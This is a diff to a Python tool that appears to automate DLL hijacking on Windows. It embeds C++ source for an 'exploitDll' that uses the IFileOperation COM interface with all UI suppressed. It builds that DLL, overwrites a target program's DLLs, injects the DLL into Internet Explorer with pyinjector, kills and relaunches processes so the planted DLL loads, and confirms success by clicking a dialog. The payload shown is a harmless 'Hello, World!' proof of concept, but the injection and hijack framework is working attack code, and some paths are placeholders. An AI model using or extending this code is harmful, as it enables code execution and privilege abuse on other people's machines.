@@ -1,9 +1,10 @@
-import os, signal
-from tqdm import tqdm
+import os
 from pyinjector import inject
 import subprocess
 import psutil
 import shutil
+from pywinauto import Application
+import time
 class hiJacking():
     def hiJacking(self):
         pass
@@ -97,7 +98,7 @@ class hiJacking():
         return pid
         
     #악성 dll을 입력받은 경로로 바꿔줌
-    def change_dll(self,dll_path,hijactable_dll_path,pid):
+    def change_dll(self,dll_path,hijactable_dll_path):
         try:
             for i in hijactable_dll_path:
                 os.remove(i)
@@ -189,21 +190,147 @@ class hiJacking():
         program_name, list_dlls = self.list_dll(exe_pid)
         # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
         
+        dll_code = """
+                        #include <windows.h>
+                        #include <iostream>
+                        #include <shobjidl.h>
+
+                        using namespace std;
+
+                        void hello() {
+                            AllocConsole();
+                            freopen("CONOUT$", "w", stdout);
+                            cout << "Hello, World!" << endl;
+                        }
+
+                        HRESULT CopyItem(__in PCWSTR pszSrcItem, __in PCWSTR pszDest, PCWSTR pszNewName)
+                        {
+                            //
+                            // Initialize COM as STA.
+                            //
+                            HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE); 
+                            if (SUCCEEDED(hr))
+                            {
+                                IFileOperation *pfo;
+                        
+                                //
+                                // Create the IFileOperation interface 
+                                //
+                                hr = CoCreateInstance(CLSID_FileOperation, 
+                                                    NULL, 
+                                                    CLSCTX_ALL, 
+                                                    IID_PPV_ARGS(&pfo));
+                                if (SUCCEEDED(hr))
+                                {
+                                    //
+                                    // Set the operation flags. Turn off all UI from being shown to the
+                                    // user during the operation. This includes error, confirmation,
+                                    // and progress dialogs.
+                                    //
+                                    hr = pfo->SetOperationFlags(FOF_NO_UI);
+                                    if (SUCCEEDED(hr))
+                                    {
+                                        //
+                                        // Create an IShellItem from the supplied source path.
+                                        //
+                                        IShellItem *psiFrom = NULL;
+                                        hr = SHCreateItemFromParsingName(pszSrcItem, 
+                                                                        NULL, 
+                                                                        IID_PPV_ARGS(&psiFrom));
+                                        if (SUCCEEDED(hr))
+                                        {
+                                            IShellItem *psiTo = NULL;
+                        
+                                            if (NULL != pszDest)
+                                            {
+                                                //
+                                                // Create an IShellItem from the supplied 
+                                                // destination path.
+                                                //
+                                                hr = SHCreateItemFromParsingName(pszDest, 
+                                                                                NULL, 
+                                                                                IID_PPV_ARGS(&psiTo));
+                                            }
+                                            
+                                            if (SUCCEEDED(hr))
+                                            {
+                                                //
+                                                // Add the operation
+                                                //
+                                                hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);
+
+                                                if (NULL != psiTo)
+                                                {
+                                                    psiTo->Release();
+                                                }
+                                            }
+                                            
+                                            psiFrom->Release();
+                                        }
+                                        
+                                        if (SUCCEEDED(hr))
+                                        {
+                                            //
+                                            // Perform the operation to copy the file.
+                                            //
+                                            hr = pfo->PerformOperations();
+                                        }        
+                                    }
+                                    
+                                    //
+                                    // Release the IFileOperation interface.
+                                    //
+                                    pfo->Release();
+                                }
+                        
+                                CoUninitialize();
+                            }
+                            return hr;
+                        }
+
+                        bool __stdcall DllMain(HMODULE /*module*/, DWORD reason, LPVOID /*reserved*/) {
+                            if (reason == DLL_PROCESS_ATTACH) hello();
+                            return true;
+                        }
+                    """
+        
+        
+        
         # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
         if(os.system("cmake")):
-            os.system("CreateIFileOperationDLL/Build.bat")     
+            os.system("cd CreateIFileOperationDLL && .\Build.bat")     
         else:
             os.system("cmake.msi")
             print("Cmake 설치 후 다시 기능을 실행해 주세요")
             return
         exploit_dll_path = "CreateIFileOperationDLL/Debug/exploitDll.dll"
-        # #4. explore에 빌드한 dll 인젝션
+        
+        # 4. 원본 dll을 복사 hijacking 종료 후 다시 원상 복귀
+        dll_tmp_path = "dll_tmp"
+            
+        shutil.copy2("원본 DLL 경로",dll_path)
+        # 5. explore에 빌드한 dll 인젝션
         
         inject(explore_pid,exploit_dll_path)
         
+        # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
         psutil.Process(explore_pid).kill()
         
-        psutil.Process(pid).kill()
+        psutil.Process(exe_pid).kill()
+        
+        hijacked_pid = self.create_process(exe_path)
+        
+        # 7. 기본 악성 DLL을 사용시 messageBoxA가 띄워지므로 pywinauto를 이용하여 확인 버튼 클릭 정상 동작시 성공으로 간주
+        
+        app = Application(backend="win32").connect(hijacked_pid)
+        try:
+            dlg = app.window(title_re="SECU")
+            dlg.확인.click()
+            print("Hijacking Success!")
+        except:
+            print("Hijacking Fail..")
+        # 8. 기본 악성 DLL에서 원래 DLL로 다시 복사(다시 IFileOperation을 이용)
+        
 class injection():
     def injection(self):
         pass
@@ -240,8 +367,17 @@ if __name__=='__main__':
     # path_dll = "CreateIFileOperationDLL\Debug\PROJECT_NAME.dll"
     # pid = dll_hijact.create_process(path_exe)
     # inject(pid,path_dll)
-    dll_hijact.abusing_IfileOperation(1234)
+    #dll_hijact.abusing_IfileOperation(1234)
     #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
     # success = dll_hijact.search_order_hijack(20588)    
     # for i,j in success.items():
     #     print(i,j)
+    os.system("cd CreateIFileOperationDLL && .\Build.bat")
+    time.sleep(5)
+    explore_pid = dll_hijact.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
+    inject(explore_pid,"CreateIFileOperationDLL\Debug\exploitDll.dll")    
+    os.remove("CreateIFileOperationDLL\CMakeCache.txt")
+    shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
+# 종속성 에러 방지를 위해 setup.py 작성 필요
+
+
